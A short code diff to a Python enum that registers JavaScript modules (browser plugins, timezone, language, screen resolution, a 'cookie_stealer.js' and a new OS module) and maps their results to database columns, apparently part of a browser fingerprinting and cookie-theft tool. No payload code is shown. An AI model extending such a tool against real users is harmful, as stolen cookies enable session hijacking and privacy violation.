@@ -27,13 +27,15 @@ class Module(Enum):
     LANGUAGE = 'language.js'
     SCREEN_RESOLUTION = 'screen_resolution.js'
     COOKIE_STEALER = 'cookie_stealer.js'
+    OS = 'os.js'
 
     module_name_to_db_column = nonmember({
         BROWSER_PLUGINS : 'browser_plugins',
         TIMEZONE : 'timezone',
         LANGUAGE : 'language',
-        SCREEN_RESOLUTION : 'screen_resolution'
-        # TODO : cookie stealer
+        SCREEN_RESOLUTION : 'screen_resolution',
+        COOKIE_STEALER : 'cookies',
+        OS : 'os'
     })
 
     module_name_to_display_name = nonmember({
@@ -41,7 +43,8 @@ class Module(Enum):
         TIMEZONE : 'Timezone',
         LANGUAGE : 'Language',
         SCREEN_RESOLUTION : 'Screen Resolution',
-        COOKIE_STEALER : 'Cookie Stealer'
+        COOKIE_STEALER : 'Cookie Stealer',
+        OS : 'Operating System'
     })
     
     @classmethod
